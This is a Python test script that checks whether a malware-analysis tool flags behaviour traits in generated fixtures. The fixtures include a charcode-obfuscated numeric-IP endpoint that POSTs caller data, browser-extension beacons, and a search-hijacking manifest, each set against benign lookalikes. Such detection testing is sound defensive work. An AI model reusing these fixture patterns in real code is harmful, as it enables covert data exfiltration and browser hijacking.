#!/usr/bin/env python3
"""Check XPI triage claims against capabilities and unrelated lookalikes."""

import json
from pathlib import Path
import subprocess
import tempfile
import zipfile


def reports(text):
    decoder = json.JSONDecoder()
    while text.strip():
        report, end = decoder.raw_decode(text.lstrip())
        yield report
        text = text.lstrip()[end:]


def main():
    repo = Path(__file__).resolve().parents[2]
    timer = "micro-behaviors/time/schedule/interval::timer-random-period-argument"
    numeric = "objectives/anti-static/obfuscation/string/charcode-url::js-numeric-endpoint-json-post"
    fixtures = {
        "interval.js": "setInterval(async () => { await work(); }, 2000 + ~~(Math.random() * 1000));",
        "qualified.js": "window.setInterval(callback, 500 + Math.random() * 50);",
        "timeout.js": "setTimeout(callback, 1000 + Math.floor(Math.random() * 100));",
        "callback.js": "setInterval(() => { randomWork(Math.random()); }, 1000);",
        "unrelated.js": "queue(() => {}, 2000 + Math.random() * 1000);",
        "comment.js": "setInterval(callback, 1000 + other /* Math.random() */);",
        "string.js": "setInterval(callback, 1000 + 'Math.random()');",
        "utls.go": '''package main
const dependency = "github.com/refraction-networking/utls"
const stateName = "utlsConnExtraFields"
''',
        # This helper sends caller data, but contains no command handling.
        "numeric.js": '''const endpoint = () => {
  return String.fromCharCode(104,116,116,112,58,47,47) + [83,91,103,177].join('.') + '/api';
};
async function transmit(input) {
  const response = await fetch(endpoint(), {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(input)
  });
}
''',
    }
    fixtures["numeric-statement.js"] = fixtures["numeric.js"].replace("const response = await", "await")
    fixtures["unused-helper.js"] = fixtures["numeric.js"].replace("fetch(endpoint(),", 'fetch("https://example.test/upload",')
    fixtures["unrelated-state.js"] = fixtures["numeric.js"].replace("JSON.stringify(input)", "JSON.stringify(state)")
    fixtures["other-api.js"] = fixtures["numeric.js"].replace("await fetch(", "await store(")
    with tempfile.TemporaryDirectory(prefix="xpi-bad-improve-") as directory:
        work = Path(directory)
        for name, source in fixtures.items():
            (work / name).write_text(source)
        manifest = {
            "manifest_version": 3, "name": "Site information", "version": "1.0",
            "permissions": ["webRequest"],
            "host_permissions": ["https://*.search.example/*"],
            "background": {"scripts": ["background.js"]},
            "chrome_settings_overrides": {"search_provider": {
                "name": "Example", "is_default": True,
                "search_url": "https://search.example/?dgd=RD1005531&PCSF=true&q={searchTerms}",
            }},
        }
        tracking = """const profile = {OS_name: 'system', EXT_UID: chrome.runtime.id};
fetch('https://metrics.search-service.net/report', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({event: 'Extension_Alive', ...profile})});
"""
        for name, source in [
            ("static-search.zip", tracking),
            ("runtime-search.zip", tracking + "window.location = 'https://search.example/?q=' + query;"),
        ]:
            with zipfile.ZipFile(work / name, "w") as archive:
                archive.writestr("manifest.json", json.dumps(manifest))
                archive.writestr("background.js", source)
        result = subprocess.run(
            [str(repo.parent / "cleave/target/release/cleave"), "--traits-dir", str(repo),
             "--format=json", str(work)], text=True, capture_output=True, check=True,
        )
        observed = {}
        for report in reports(result.stdout):
            for file in report["files"]:
                observed[Path(file["path"]).name] = {
                    trait["id"]: trait for trait in file.get("traits", [])
                }
        for name in ["interval.js", "qualified.js", "timeout.js"]:
            assert timer in observed[name], (name, observed[name])
        for name in ["callback.js", "unrelated.js", "comment.js", "string.js"]:
            assert timer not in observed[name], (name, observed[name])
        assert numeric in observed["numeric.js"], observed["numeric.js"]
        assert observed["numeric.js"][numeric]["crit"] == 4
        assert numeric in observed["numeric-statement.js"]
        for name in ["unused-helper.js", "unrelated-state.js", "other-api.js"]:
            assert numeric not in observed[name], (name, observed[name])
        assert "micro-behaviors/communications/http/tls::go-utls-fingerprint-customization" in observed["utls.go"]
        rewrite = "objectives/supply-chain/hidden-payload/extensions/affiliate::runtime-rewriting-search-hijack"
        assert rewrite not in observed["static-search.zip"]
        assert rewrite in observed["runtime-search.zip"], observed["runtime-search.zip"]
        for traits in observed.values():
            assert "objectives/evasion/anti-av/tls-fingerprint::go-utls-fingerprint-spoofing" not in traits
            assert "objectives/command-and-control/channel/http/transport::direct-ip-numeric-endpoint-json-post-channel" not in traits
    print("XPI claim and randomized-timer controls: 15 passed")


if __name__ == "__main__":
    main()
